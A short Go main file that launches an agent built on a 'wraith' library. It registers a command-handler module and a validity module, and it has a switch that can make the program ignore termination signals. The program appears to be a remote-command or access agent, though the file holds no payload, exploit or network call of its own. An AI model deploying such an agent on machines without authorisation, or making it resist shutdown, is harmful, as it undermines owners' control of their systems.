package main

import (
	"os"
	"os/signal"
	"syscall"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod/mod_part"
)

const RESPECT_EXIT_SIGNALS = true

var exitTrigger chan struct{}

func setupCloseHandler(triggerChannel chan struct{}) {
	c := make(chan os.Signal)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	go func() {
		<-c
		if RESPECT_EXIT_SIGNALS {
			triggerChannel <- struct{}{}
		}
	}()
}

func init() {
	exitTrigger = make(chan struct{})
	setupCloseHandler(exitTrigger)
}

func main() {
	// Set up Wraith
	w := libwraith.Wraith{
		Conf: libwraith.WraithConf{
			Fingerprint: "a",
		},
	}
	w.Init()

	// Set up modules
	w.Modules.Register("w.cmd", libwraith.ModProtoPart, mod_part.CmdHandler{}, true)
	w.Modules.Register("w.validity", libwraith.ModProtoPart, mod_part.ValidityHandler{}, true)

	// Run Wraith
	go w.Run()
	<-exitTrigger
	w.Shutdown()
}
